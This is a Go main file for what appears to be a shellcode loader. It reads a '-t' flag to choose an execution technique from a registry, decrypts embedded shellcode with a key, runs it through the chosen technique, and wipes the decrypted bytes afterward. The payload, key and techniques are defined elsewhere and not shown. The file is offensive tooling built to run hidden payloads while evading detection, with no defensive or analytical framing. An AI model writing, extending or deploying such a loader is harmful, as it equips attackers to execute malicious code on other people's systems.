package main

import (
	"os"
	"strconv"

	"loader/internal/config"
	"loader/internal/crypto"
	"loader/internal/techniques"
)

func main() {
	techIdx := config.DefaultTechnique
	args := os.Args[1:]
	for i := 0; i < len(args); i++ {
		if args[i] == "-t" && i+1 < len(args) {
			if v, err := strconv.Atoi(args[i+1]); err == nil {
				techIdx = v
			}
			i++
		}
	}

	if techIdx < 0 || techIdx >= len(techniques.Registry) {
		os.Exit(1)
	}

	sc := crypto.Decrypt(shellcode, key)
	if len(sc) == 0 {
		os.Exit(1)
	}

	ok := techniques.Registry[techIdx].Fn(sc)
	crypto.Wipe(sc)

	if !ok {
		os.Exit(1)
	}
}
